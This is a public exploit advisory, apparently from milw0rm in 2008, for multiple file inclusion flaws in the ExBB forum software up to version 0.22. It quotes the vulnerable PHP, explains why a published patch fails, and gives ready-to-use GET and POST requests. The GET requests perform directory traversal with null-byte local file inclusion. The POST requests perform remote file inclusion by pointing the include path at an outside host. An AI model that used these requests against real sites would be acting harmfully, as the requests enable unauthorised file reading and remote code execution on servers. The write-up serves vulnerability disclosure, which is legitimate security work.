@@ -1,0 +1,63 @@
+#====================================================================================================#
+#                     ____            __________         __             ____  __                     #
+#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                   #
+#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\                  #
+#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                    #
+#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                    #
+#                              \/\______|      \/     \/                                             #
+#====================================================================================================#
+#                                     This is a public Exploit                                       #
+#====================================================================================================#
+#  	           		            ExBB <= 0.22                                             #
+#                         Multiple File Inclusion / Code Execution Vulnerability                     #
+#	     	               								             #
+#====================================#===============#====================================#==========#
+# Server Configuration Requirements  #               # Some Information                   #          #
+#====================================#		     #====================================#          #
+#                                                    #                                               #
+# [RFI]                       [LFI]                  #  Vendor:   exbb.clans.it                      #
+#                                                    #  Author:   The:Paradox                        #
+# register_globals   = 1      register_globals = 1   #  Severity: Moderately Critical                #
+# allow_url_fopen    = 1      magic_quotes_gpc = 0   #                                               #
+# allow_url_finculde = 1 			     #  Proud To Be Italian.                         #
+#                                                    #                                               #
+#====================================#===============#===============================================#
+# Proof Of Concept / Bug Explanation #                                                               #
+#====================================#                                                               #
+# Exbb presents File Inclusion Vulnerabilities. Let's have a look of the source.                     #
+#                                                                                                    #
+#  /modules/threadstop/threadstop.php                                                                #
+#                                                                                                    #
+#  1. <?php                                                                                          #
+#  2. ################# PATCH by Flippo ######################                                       #
+#  3. if ((stristr($_SERVER['QUERY_STRING'], 'exbb[home_path]'))                                     #
+#  4. or (stristr($_SERVER['QUERY_STRING'], "exbb['home_path']"))) {                                 #
+#  5. die();                                                                                         #
+#  6. }                                                                                              #
+#  7. ########################################################                                       #
+#  8.                                                                                                #
+#  9. include($new_exbb[home_path].'modules/threadstop/data/threadstop_data.php');                   #
+# 10. include($exbb[home_path].'modules/threadstop/language/'.$exbb[default_lang].'/lang.php');      #
+#                                                                                                    #
+# The patch of Filippo, is a completely useless code.                                                #
+# When Register_Globals is On we can set $new_exbb[home_path] not only via GET variables, but        #
+# also via POST and COOKIE.                                                                          #
+# Moreover Filippo has forgot to fix $exbb[default_lang] too.                                        #
+#                                                                                                    #
+# Example:                                                                                           #
+#                                                                                                    #
+# [LFI]                                                                                              #
+#                                                                                                    #
+# GET  site.it/Ex/modules/threadstop/threadstop.php?exbb[default_lang]=../../../../../../[File]%00   #
+# GET  site.it/Ex/modules/threadstop/threadstop.php?exbb[default_lang]=../../../../../install.php%00 #
+#                                                                                                    #
+# [RFI]                                                                                              #
+#                                                                                                    #
+# POST site.it/Ex/modules/threadstop/threadstop.php?  new_exbb[home_path]=http://www.google.it?      #
+# POST site.it/Ex/modules/threadstop/threadstop.php?  exbb[home_path]=http://www.yoursite.com/page?  #
+#                                                                                                    #
+#====================================================================================================#
+# Use this at your own risk. You are responsible for your own deeds.                                 #
+#====================================================================================================#
+
+# milw0rm.com [2008-04-08]
